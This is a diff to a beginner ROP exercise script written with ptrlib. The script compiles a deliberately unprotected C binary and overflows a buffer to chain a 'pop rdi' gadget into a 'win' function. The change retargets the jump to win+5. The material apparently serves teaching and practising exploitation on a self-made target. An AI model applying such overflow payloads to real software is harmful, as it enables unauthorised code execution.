@@ -1,10 +1,8 @@
 from ptrlib import *
 
-
 def main():
     """
-
-```
+```bash
 << EOF cat | gcc -no-pie -fno-stack-protector -o easy -x c -
 #include <stdio.h>
 #include <stdlib.h>
@@ -40,7 +38,7 @@ uv run rop/rop_easy.py
     payload = b'p' * 8 * 5
     payload += p64(next(elf.gadget("pop rdi; ret")))
     payload += p64(0xdeadbeef)
-    payload += p64(elf.symbol("win"))
+    payload += p64(elf.symbol("win") + 5)
     proc.sendline(payload)
     proc.interactive()
 
